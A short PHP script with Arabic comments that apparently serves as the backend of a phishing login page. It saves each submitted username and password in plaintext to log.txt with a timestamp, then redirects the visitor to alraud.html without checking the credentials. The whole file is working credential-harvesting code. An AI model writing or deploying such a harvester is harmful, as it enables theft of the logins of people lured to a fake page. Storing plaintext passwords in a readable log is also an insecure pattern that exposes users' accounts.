<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = htmlspecialchars($_POST['username']);
    $pass = htmlspecialchars($_POST['password']);

    // حفظ البيانات في log.txt
    $file = fopen("log.txt", "a");
    $time = date("Y-m-d H:i:s");
    fwrite($file, "[$time] Username: $user | Password: $pass" . PHP_EOL);
    fclose($file);

    // التوجيه إلى alraud.html بعد تسجيل الدخول
    header("Location: alraud.html");
    exit();
} else {
    echo "الرجاء إدخال البيانات عبر النموذج.";
}
?>
